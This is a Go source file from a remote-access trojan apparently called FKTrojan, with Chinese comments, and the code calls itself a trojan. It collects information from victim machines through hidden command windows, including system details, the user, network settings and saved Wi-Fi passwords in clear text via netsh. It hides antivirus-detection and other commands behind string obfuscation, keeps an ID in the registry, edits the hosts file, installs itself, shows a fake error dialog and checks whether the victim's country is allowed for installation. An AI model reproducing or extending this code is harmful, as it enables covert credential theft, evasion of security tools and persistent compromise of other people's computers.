/*
Author: FreeKnight
获取自身的一些信息
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"

	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows/registry"
)

//------------------------------------------------------------
func loadInfo() {
	myIP = getIP()   // 获取本客户端的IP地址
	myUID = getUID() // 获取本客户端的唯一ID
	checkifAdmin()   // 顺道检查下本客户端是不是管理员
}

//------------------------------------------------------------
// 检查客户端是否有管理员权限
func checkifAdmin() {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		setAdmin(false)
	} else {
		setAdmin(true)
	}
}

//------------------------------------------------------------
// 尝试从网上获取自身IP
func getIP() string {
	for i := 0; i < len(checkIP); i++ {
		rsp, _ := http.Get(checkIP[i])
		if rsp.StatusCode == 200 {
			defer rsp.Body.Close()
			buf, _ := ioutil.ReadAll(rsp.Body)
			return string(bytes.TrimSpace(buf))
		}
	}
	return "127.0.0.1"
}

//------------------------------------------------------------
// 获取自身的UUID，若找不到，则新创建一份
func getUID() string {
	for i := 0; i < len(registryNames); i++ {
		val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+registryNames[i]+"\\", "ID")
		if err != nil { //Make new UUID
			continue
		}
		return common.Deobfuscate(val)
	}
	uuid, _ := newUUID()
	// 回写uuid，保证下次程序重启后获取到此id
	writeUID(uuid)
	return uuid
}
func writeUID(uid string) error {
	registry.CreateKey(registry.CURRENT_USER, "Software\\"+registryNames[0], registry.ALL_ACCESS)
	return writeRegistryKey(registry.CURRENT_USER, "Software\\"+registryNames[0]+"\\", "ID", common.Obfuscate(uid))
}

//------------------------------------------------------------
// 生成一个UUID
func newUUID() (string, error) {
	uuid := make([]byte, 16)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		return "", err
	}
	uuid[8] = uuid[8]&^0xc0 | 0x80
	uuid[6] = uuid[6]&^0xf0 | 0x40
	return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:]), nil
}

//------------------------------------------------------------
// 检查软件安装情况
func checkInstalledInfo() {
	// 检查系统中的版本
	isInstalled, val1, val2 := scanReg()
	if !isInstalled {
		if isFKDebug {
			FKDebugLog("We didn't installed in this system, this app should be exit.")
		} else {
			os.Exit(-1)
		}
	}
	myInstallReg = val1
	myExeName = val2
}

//------------------------------------------------------------
// 检查软件安装情况（加强版）
func checkInstalledInfoEx() {
	// 检查系统中的版本
	//isinstalled, val1, val2 := scanReg()
	//if isinstalled {
	//	myInstallReg = val1
	//	myExeName = val2
	//} else {
		// 给个小警告框吓吓你
		if startUpError {
			messageBox(startUpErrorTitle, startUpErrorText, MB_ICONERROR)
		}
		// 自我安装
		if installMe {
			uninstall()
			install()
		}
		// 修改Host文件
		if editHosts {
			editHost(hostlist, false)
		}
	//}
}

//------------------------------------------------------------
// 检查是否已安装，若已安装则获取其他信息
func scanReg() (isinstalled bool, dat string, data string) {
	for i := 0; i < len(registryNames); i++ {
		val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+registryNames[i]+"\\", "NAME")
		if err == nil {
			return true, registryNames[i], common.Deobfuscate(val)
		}
	}
	return false, "", ""
}

//------------------------------------------------------------
// WIFI列表
func getWifiList() string {
	List := exec.Command("cmd", "/C", "netsh wlan show profile name=* key=clear")
	List.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := List.Output()

	return string(History)
}

//------------------------------------------------------------
// 已安装的软件列表
func getInstalledSoftware() string {
	var tmp string = ""
	var dst []Win32_Product
	q := wmi.CreateQuery(&dst, "")
	_ = wmi.Query(q, &dst)
	for _, v := range dst {
		tmp += *v.Name + "|"
	}
	return tmp
}

//------------------------------------------------------------
// IPCONFIG
func getIPConfig() string {
	Info := exec.Command("cmd", "/C", "ipconfig")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

//------------------------------------------------------------
// 系统版本
func getOS() string {
	Info := exec.Command("cmd", "/C", "ver")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(string(History))
}

//------------------------------------------------------------
// 用户信息
func getWhoami() string {
	Info := exec.Command("cmd", "/C", "whoami")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

//------------------------------------------------------------
// 系统信息
func getSysInfo() string {
	Info := exec.Command("cmd", "/C", "systeminfo")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

//------------------------------------------------------------
// CPU
func getCPU() string {
	Info := exec.Command("cmd", "/C", common.Deobfuscate("xnjd!dqv!hfu!obnf"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(strings.Replace(string(History), "Name", "", -1))
}

//------------------------------------------------------------
// GPU
func getGPU() string {
	Info := exec.Command("cmd", "/C", common.Deobfuscate("xnjd!qbui!xjo43`WjefpDpouspmmfs!hfu!obnf"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(strings.Replace(string(History), "Name", "", -1))
}

//------------------------------------------------------------
// 运行路径
func getRunningPath() string {
	return os.Args[0]
}

//------------------------------------------------------------
// 反病毒软件列表
func getAntiVirus() string {
	Info := exec.Command("cmd", "/C", common.Deobfuscate("XNJD!0Opef;mpdbmiptu!0Obnftqbdf;]]sppu]TfdvsjuzDfoufs3!Qbui!BoujWjsvtQspevdu!Hfu!ejtqmbzObnf!0Gpsnbu;Mjtu"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	if strings.Contains(string(History), "=") {
		AV := strings.Split(string(History), "=")
		return stripSpaces(string(AV[1]))
	} else {
		return stripSpaces(string(History))
	}
}

//------------------------------------------------------------
// 本木马安装时间
func getInstallDate() string {
	val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "INSTALL")
	if err != nil {
		return curTime
	} else {
		return val
	}
}

//------------------------------------------------------------
// 检查当前这个IP所属国家是否可进行安装
func canThisCountryInstalled() bool {
	var client = new(http.Client)
	q, _ := http.NewRequest("GET", maxMindURL, nil)
	q.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	q.Header.Set("Referer", common.Deobfuscate(`iuuqt;00xxx/nbynjoe/dpn0fo0mpdbuf.nz.jq.beesftt`))
	r, err := client.Do(q)
	if err != nil {
		FKDebugLog("We don't know if it's in campaign write list organization. but we'll install it first.")
		return true
	}
	defer r.Body.Close()
	if r.StatusCode == 200 {
		defer r.Body.Close()
		buf, _ := ioutil.ReadAll(r.Body)
		var pro maxMind
		_ = json.NewDecoder(strings.NewReader(string(bytes.TrimSpace(buf)))).Decode(&pro)
		for i := 0; i < len(campaignWhitelist); i++ {
			if strings.Contains(strings.ToUpper(pro.Country.Names.En), strings.ToUpper(campaignWhitelist[i])) {
				FKDebugLog("Our IP is in campaign write list organization : " + pro.Country.Names.En)
				return true
			}
		}
	}
	return false
}

//------------------------------------------------------------
